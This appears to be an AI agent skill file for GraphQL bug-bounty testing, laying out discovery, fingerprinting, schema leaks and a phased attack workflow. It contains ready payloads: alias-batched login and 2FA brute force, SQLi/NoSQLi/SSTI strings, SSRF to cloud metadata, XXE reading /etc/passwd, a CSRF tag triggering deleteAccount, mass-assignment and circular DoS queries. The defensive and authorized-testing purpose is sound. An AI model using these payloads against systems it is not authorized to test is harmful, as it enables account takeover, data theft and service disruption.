---
name: graphql-hunt
description: Dedicated GraphQL vulnerability hunting — endpoint discovery, engine fingerprinting (graphw00f), introspection & field-suggestion schema leaks, batch/alias-based rate-limit bypass and brute force, depth/circular query DoS, field-level authorization IDOR, mutation abuse, CSRF via GET, SSRF via URL fields, injection through arguments (SQLi/NoSQLi/SSTI/command), persisted-query bypass, subscription/WebSocket abuse, JWT/auth issues carried into the resolver layer, and directive abuse (@skip/@include). Use when a target exposes /graphql, /api/graphql, /graphiql, /playground, /altair, /v1/graphql, /query, or any endpoint that responds to `{__typename}`. Also use when asked "how do I test GraphQL", when analyzing a GraphQL schema, or when chasing high-severity bugs on Apollo/Hasura/Graphene/Yoga/AWS AppSync/Relay/PostGraphile/Absinthe backends.
---

# GraphQL Hunt

Dedicated workflow for GraphQL endpoints. Where classical REST hunting looks at endpoints and parameters, GraphQL hunting looks at the **schema, resolvers, and query engine**. The bugs cluster differently — schema disclosure, single-request abuse (batching/aliasing), and resolver-level authz gaps dominate the payout list.

Run this skill in order: **Discover → Fingerprint → Enumerate → Attack → Chain**.

---

## Phase 1 — Discover

Find the GraphQL endpoint(s). Almost every production app exposes at least one.

**Standard paths** (check in this order):
```
/graphql
/api/graphql
/v1/graphql
/v2/graphql
/graphql/v1
/query
/api/query
/graphiql
/playground
/altair
/explorer
/api/explorer
/graphql-api
/api
```

**Non-obvious paths** — grep any JS bundle for these strings:
```
"query "
"mutation "
"__typename"
"__schema"
"gql`"
"apollo"
"relay"
".graphql"
graphqlUrl
GRAPHQL_URL
```

**Detection probe** — POST `{"query":"{__typename}"}` with `Content-Type: application/json`. Any of these responses = GraphQL:
- `{"data":{"__typename":"Query"}}` — canonical
- `{"errors":[...]}` mentioning `Cannot query field`, `Syntax Error`, `Field "..." of type`
- Response includes `"extensions"` key
- `200` with `{"data":null}` and errors mentioning types

**Also try GET** — `?query={__typename}` — many endpoints accept it (see CSRF section).

---

## Phase 2 — Fingerprint the Engine

The engine matters. Bugs and bypasses differ across implementations.

```bash
# Best signal: graphw00f (identifies 20+ engines by quirks)
graphw00f -t https://target.com/graphql -d

# Manual signal: send malformed queries and observe error text
curl -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"query @skip { __typename }"}'
```

**Engine → known-good attacks:**

| Engine | Known weakness |
|---|---|
| Apollo Server | Field suggestions on by default (schema leak even w/ introspection off). Batching supported. |
| Hasura | GraphQL over WebSocket subs; permission rules often forgotten on nested relations. Admin secret in headers. |
| Graphene (Python) | Debug mode leaks stack traces. `graphene-django` often ships with `graphiql=True`. |
| Yoga / graphql-yoga | Landing page enabled by default. Health endpoint at `/health`. |
| AWS AppSync | IAM-signed vs API-key vs Cognito modes — API key often long-lived and leaked in JS. |
| PostGraphile | Auto-generates full CRUD from Postgres — often exposes internal tables. |
| Ruby (graphql-ruby) | `graphql-batch` alias amplification. Query complexity often not set. |
| Absinthe (Elixir) | Introspection on by default, complexity plugin often missing. |
| Hot Chocolate (.NET) | Verbose errors in Development env leak into prod. |

Also record: **is `/graphql` behind auth?** If unauthenticated returns real data, that alone can be a finding — always compare authed vs unauthed response.

---

## Phase 3 — Enumerate the Schema

### 3a. Introspection (the easy path)

```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args { name description type { ...TypeRef } defaultValue }
    type { ...TypeRef }
    isDeprecated
    deprecationReason
  }
  inputFields { name description type { ...TypeRef } defaultValue }
  interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason }
  possibleTypes { ...TypeRef }
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind name
    ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } }
  }
}
```

**If introspection is disabled**, try these bypasses before giving up:

1. **HTTP method swap** — POST blocked? Try `GET /graphql?query={__schema{types{name}}}`
2. **Content-Type swap** — try `application/x-www-form-urlencoded` with `query=...`, or `application/graphql` (raw body)
3. **Newline/space injection** — `__ schema`, `__%09schema`, `__%0aschema` — some allowlist filters split on exact match
4. **Version paths** — `/v1/graphql` allows introspection while `/graphql` blocks it (real bug pattern)
5. **Non-standard fields** — `__type(name:"User")` may be allowed when `__schema` is blocked
6. **`GET` with `?operationName=IntrospectionQuery`** — some middleware only checks POST bodies

### 3b. Field suggestions (Apollo's gift)

Even with introspection off, Apollo returns:
```json
{"errors":[{"message":"Cannot query field \"secretPassword\" on type \"User\". Did you mean \"password\" or \"passwordHash\"?"}]}
```

That's a schema leak. Use **clairvoyance** to weaponize:
```bash
clairvoyance -o schema.json https://target.com/graphql \
  -w /usr/share/wordlists/graphql-fields.txt
```

Clairvoyance brute-forces every possible field name and reconstructs the schema from suggestion errors. Slow but reliable when introspection is disabled.

### 3c. Manual field walking

If suggestions are off too, walk the schema by trying common patterns:
```
{ me { id email role isAdmin } }
{ user(id:1) { ... } }
{ users { ... } }
{ viewer { ... } }
{ currentUser { ... } }
{ node(id:"...") { ... } }  # Relay convention
```

---

## Phase 4 — Attack

### 4a. Field-level authorization IDOR (highest payout bug class)

REST IDORs happen on URL params. **GraphQL IDORs happen on arguments and on nested field selection.** Two flavors:

**Flavor 1: argument IDOR** — same as REST:
```graphql
# Change user IDs and see if you get another user's data
query { user(id: 12345) { email phone address ssn } }
```

**Flavor 2: nested field IDOR** (GraphQL-specific, often missed):
```graphql
# Auth may be checked on `order` but NOT on `.user.email`
query {
  order(id: "your-own-order-id") {
    user {              # This resolver may leak any user tied to any order
      email
      phone
      internalNotes     # Fields you can't query directly
      billingAddress
    }
  }
}
```

**Flavor 3: Relay `node()` bypass:**
```graphql
# Global object identifier — often skips per-type authz checks
query { node(id: "VXNlcjoxMjM0NQ==") { ... on User { email role } } }
```
Base64 decode `VXNlcjoxMjM0NQ==` → `User:12345`. Enumerate IDs, decode → base64 → query.

### 4b. Batch queries — rate limit / brute force / cost bypass

Two batching styles:

**Query batching (array of operations):**
```json
[
  {"query":"mutation{login(user:\"admin\",pass:\"password1\"){token}}"},
  {"query":"mutation{login(user:\"admin\",pass:\"password2\"){token}}"},
  {"query":"mutation{login(user:\"admin\",pass:\"password3\"){token}}"}
]
```
1000 login attempts in 1 HTTP request → rate limit sees "1 request" and passes.

**Alias batching (single operation, N aliases):**
```graphql
mutation {
  try1: login(user:"admin", pass:"password1") { token }
  try2: login(user:"admin", pass:"password2") { token }
  try3: login(user:"admin", pass:"password3") { token }
}
```
Same trick, works even when array batching is disabled. Any resolver returning a token, OTP-verify status, coupon status, or "does this account exist" is fair game.

**Real payout patterns:**
- 2FA/OTP brute force: `verify2FA(code: "000001") ... verify2FA(code: "999999")` — 1M aliases across N requests
- Coupon code brute force
- Login credential stuffing at 100–1000x speed
- Account existence oracles (`resetPassword` returning different errors for known vs unknown emails)

### 4c. Depth / circular query DoS

Only report when **you confirm impact** — kill the server (test carefully!) or force multi-second responses:

```graphql
query circular {
  user(id:1) {
    friends {
      friends {
        friends {
          friends {
            friends { friends { friends { id name } } }
          }
        }
      }
    }
  }
}
```

If the target has no depth limit, exponential blowup crashes the resolver. **Don't hit prod hard** — enough to show the response time balloons or an error appears. Many programs treat this as **info** unless you show real DoS. Chain with cost analysis: `graphql-cop -t URL` measures response times.

### 4d. Injection through arguments

GraphQL is just a query layer. Whatever the resolver does with the argument is still SQLi/NoSQLi/SSTI/command injection territory.

```graphql
# SQLi via search
{ users(filter: "' OR 1=1--") { id email } }

# NoSQL injection (MongoDB backend)
{ users(where: "{'$ne': null}") { email } }

# SSTI via templated fields
{ notify(message: "{{7*7}}") }

# SSRF via URL fields
mutation { importFromUrl(url: "http://169.254.169.254/latest/meta-data/") { result } }

# XXE via XML upload fields
mutation { uploadDocument(file: "<!DOCTYPE root [<!ENTITY x SYSTEM 'file:///etc/passwd'>]><root>&x;</root>") }
```

**High-payout pattern**: any mutation taking a URL argument → probe for SSRF (see security-arsenal SSRF bypass table). AWS AppSync + Lambda resolvers are especially juicy.

### 4e. Mutation abuse

Introspection reveals every mutation. Look for:
- `updateUser(userId, role)` — mass assignment / privilege escalation
- `changeEmail(userId, newEmail)` — ATO if `userId` is not scoped to viewer
- `deleteUser(id)` — auth check missing
- `setPassword(userId, newPassword)` — direct password reset
- `sendInvitation(email, role)` — invite yourself as admin
- `refund(orderId, amount)` — business logic

**Mass assignment via GraphQL input types:**
```graphql
mutation {
  updateProfile(input: {
    displayName: "test"
    role: "ADMIN"          # Not exposed in UI, but in input type
    isVerified: true
    creditBalance: 999999
  }) { id role }
}
```
The frontend only sends `displayName`, but the resolver blindly spreads the whole input into the DB. Check the input type in the schema for fields the UI doesn't send.

### 4f. CSRF via GET queries

Many GraphQL endpoints accept queries as GET params. If **mutations** work over GET, CSRF is trivial:
```
<img src="https://target.com/graphql?query=mutation{deleteAccount}">
```

Test both:
- `GET /graphql?query=mutation{...}` — many Apollo configs allow
- `POST /graphql` with `Content-Type: text/plain` or `application/x-www-form-urlencoded` — bypasses simple CSRF checks that only guard `application/json`

### 4g. Persisted query bypass

Some APIs only accept whitelisted "persisted queries" (hash → server-side query). Bypass patterns:

- Send both `query` AND `extensions.persistedQuery.sha256Hash` — some servers execute the raw `query` when hash misses
- **Automatic Persisted Queries (APQ)**: send `extensions.persistedQuery.sha256Hash` for arbitrary query → server responds `PersistedQueryNotFound` → resend with `query` filled in → server caches it and you've persisted arbitrary query
- Look for older API versions without the whitelist

### 4h. Subscription / WebSocket abuse

`wss://target.com/graphql` with `graphql-ws` or `subscriptions-transport-ws` subprotocol. Common bugs:
- Auth token only checked on connection init, not per-subscription — subscribe to admin channels after authenticating as normal user
- Broadcast leakage — subscribe to `messagesReceived` and get messages for other users
- Rate limit bypass — subscriptions bypass HTTP rate limiters
- Pure DoS — subscribe with expensive filters

Test with `wscat -c wss://target/graphql -s graphql-ws`.

### 4i. Directive abuse

`@skip(if: ...)` and `@include(if: ...)` can be used with variables to bypass some middleware that inspects the query string for sensitive fields:
```graphql
query($showSecret: Boolean!) {
  user { email password @include(if: $showSecret) }
}
```
Rare, but occasionally slips past field-level allowlists.

### 4j. Errors that leak

Always try:
- Malformed queries → stack traces (Graphene DEBUG=True is famous)
- Wrong argument type → error text may reveal internal types, DB column names, file paths
- Fields that timeout → often reveal backend service names
- Unicode/emoji in strings → occasionally trip parsers into leaking

---

## Phase 5 — Chain

GraphQL findings become P1/P2 by chaining. Common combos:

| A | + B | = payout |
|---|---|---|
| Introspection enabled | + IDOR on `user(id)` | Mass PII scrape (leverage schema to know every field to pull) |
| Field-level IDOR on `.user.email` | + `resetPassword(email)` mutation | ATO of arbitrary user |
| Alias batching | + login mutation | Credential stuffing at 1000x, mass ATO |
| Alias batching | + OTP verify | 2FA bypass |
| Mass assignment on `updateProfile` | + `role` field in input type | Privilege escalation |
| SSRF via mutation URL arg | + IMDS / internal admin panel | RCE, cloud takeover |
| CSRF via GET mutation | + `deleteAccount` / `transferFunds` | 1-click account/funds takeover |
| APQ bypass | + rate-limited login | Rate limit bypass → brute force |
| Subscription auth-once | + admin channel subscribe | Real-time admin data leak |

Route to `security-arsenal` for payloads, `bug-bounty` for the full recon+report pipeline, `report-writing` when validated.

---

## Toolchain (install order of usefulness)

| Tool | What it does | Install |
|---|---|---|
| **graphw00f** | Engine fingerprint | `pip install graphw00f` or `git clone https://github.com/dolevf/graphw00f` |
| **graphql-cop** | Automated audit (introspection, batching, depth, cost) | `pip install graphql-cop` |
| **clairvoyance** | Schema inference w/o introspection | `pip install clairvoyance` |
| **graphqlmap** | SQLi / interactive shell | `git clone https://github.com/swisskyrepo/GraphQLmap` |
| **InQL** (Burp) | Schema import, query builder, scan | Burp BApp Store |
| **BatchQL** | Batch/alias payload generator | `git clone https://github.com/assetnote/batchql` |
| **wscat** | WebSocket subscription testing | `npm i -g wscat` |

Minimum viable toolkit: **graphw00f + graphql-cop + clairvoyance + curl**.

---

## Quick-start commands

```bash
# 1. Fingerprint
graphw00f -t https://target.com/graphql -d

# 2. Automated audit (batching, introspection, depth, cost, GET/POST)
graphql-cop -t https://target.com/graphql

# 3. Grab schema (introspection on)
curl -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d @scripts/introspection.json | jq . > schema.json

# 4. If introspection off, brute schema
clairvoyance https://target.com/graphql -w wordlist.txt -o schema.json

# 5. Convert to SDL for reading
python -c "from graphql import build_client_schema, print_schema; import json; \
  print(print_schema(build_client_schema(json.load(open('schema.json'))['data'])))" > schema.graphql
```

---

## Reporting notes

- **Introspection alone** is usually **info** — needs to be chained with a real bug. Never submit standalone unless the program explicitly rewards it (rare).
- **Field suggestions** — same, info-only alone.
- **Depth DoS without proof** — will be rejected. Show measured response times or a crash.
- **Batch abuse** — always chain with the *thing it enables* (brute force, credential stuffing). Standalone "batching is enabled" is info.
- **Mass assignment** — always show the concrete impact (privilege escalation, financial change). "Extra field accepted" without impact is nothing.
- Run through `triage-validation` 7-Question Gate before writing the report — GraphQL findings especially benefit from clear impact framing.

For report structure, hand off to `report-writing`.
